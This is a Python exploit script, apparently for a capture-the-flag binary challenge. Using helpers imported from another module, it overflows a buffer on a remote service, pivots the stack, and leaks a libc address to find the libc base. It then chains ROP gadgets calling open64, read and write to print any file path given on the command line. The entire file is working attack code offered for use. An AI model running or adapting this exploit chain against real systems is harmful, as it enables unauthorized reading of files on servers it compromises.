#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""按任意路径 open+read+write, 原始输出 (用于排查 flag 位置)"""
import socket, struct, sys, time
from exp import (p64, u64, Conn, win6, ovf,
                 READ_SITE, WRITE_PLT, READ_STUB, WRITE_STUB, RET_G, LEAVE_RET, MAIN,
                 OFF_WRITE, OFF_READ, OFF_OPEN64, OFF_POP_RDI, OFF_POP_RSI, OFF_POP_RDX, OFF_ADD_RSP,
                 CH, PATH, BUF, S, STK, log)


def run(path, cnt=0x200):
    c = Conn()
    if len(c.rn(0x13, 4)) < 0x13:
        log("[!] no banner"); return None
    ovf(c, 0x404040); c.rn(9)
    win6(c, [LEAVE_RET, 0, 0, 0, S+0x20, READ_SITE]); c.rn(9)
    win6(c, [0, MAIN, 0, 0, STK+0x20, READ_SITE]);    c.rn(9)
    win6(c, [0, MAIN, 0, 0, 0x404038, READ_SITE]);    c.rn(9)

    c.send(p64(READ_STUB)*2 + p64(WRITE_STUB) + p64(READ_STUB) + p64(STK))
    o1 = c.rn(9 + 0x13, 3)
    if b"name" not in o1:
        log("[!] heal failed"); return None

    ovf(c, 0x404038); c.rn(9)
    win6(c, [WRITE_PLT, S, LEAVE_RET, 0, 0x404040, READ_SITE])
    out = c.rn(9 + 0x30 + 9 + 0x13, 4)
    if len(out) < 9 + 0x30:
        log("[!] leak failed"); return None
    lk = out[9:9+0x30]
    w = [u64(lk[i*8:i*8+8]) for i in range(6)]
    libc = w[1] - OFF_WRITE
    if (libc & 0xfff) or libc < 0x7f0000000000:
        log("[!] bad base"); return None
    time.sleep(0.2); c.drain(0.4)

    rdi, rsi, rdxb = libc+OFF_POP_RDI, libc+OFF_POP_RSI, libc+OFF_POP_RDX
    add = libc+OFF_ADD_RSP
    steps = [("pair", [rdi, PATH]),
             ("pair", [rsi, 0]),
             ("call", [libc+OFF_OPEN64]),
             ("pair", [rdi, 3]),
             ("pair", [rsi, BUF]),
             ("tri",  [rdxb, cnt, 0]),
             ("call", [libc+OFF_READ]),
             ("pair", [rdi, 1]),
             ("pair", [rsi, BUF]),
             ("tri",  [rdxb, cnt, 0]),
             ("call", [libc+OFF_WRITE])]
    dest = CH
    plan = []
    for kind, args in steps:
        if kind == "pair":
            q = args + [add, 0]; nxt = dest + 0x30
        elif kind == "call":
            q = args + [RET_G, add, 0]; nxt = dest + 0x30
        else:
            q = args + [add]; nxt = dest + 0x38
        plan.append((dest, q, nxt)); dest = nxt

    entry_dest = dest + 0x30
    for i, (d, q, nxt) in enumerate(plan):
        if i == len(plan)-1:
            nxt = PATH
        if i == 0:
            ovf(c, d); c.rn(9)
        win6(c, q + [nxt+0x20, READ_SITE])
        if len(c.rn(9)) != 9:
            log("[!] step %d ack fail" % i); return None

    ps = path.ljust(0x20, b"\0")
    win6(c, [u64(ps[0:8]), u64(ps[8:16]), u64(ps[16:24]), u64(ps[24:32]),
             entry_dest+0x20, READ_SITE])
    c.rn(9)

    win6(c, [0, 0, 0, 0, CH-8, LEAVE_RET])
    time.sleep(0.6)
    return c.drain(3.0)


if __name__ == "__main__":
    a = sys.argv[1]
    # '!' 开头 = 绝对路径（避开本地执行层对绝对路径的改写）
    p = (("/" + a[1:]) if a.startswith("!") else a).encode()
    n = int(sys.argv[2], 0) if len(sys.argv) > 2 else 0x200
    for _ in range(5):
        r = run(p, n)
        if r:
            print("PATH", p, "LEN", len(r))
            print(repr(r))
            break
        time.sleep(1)
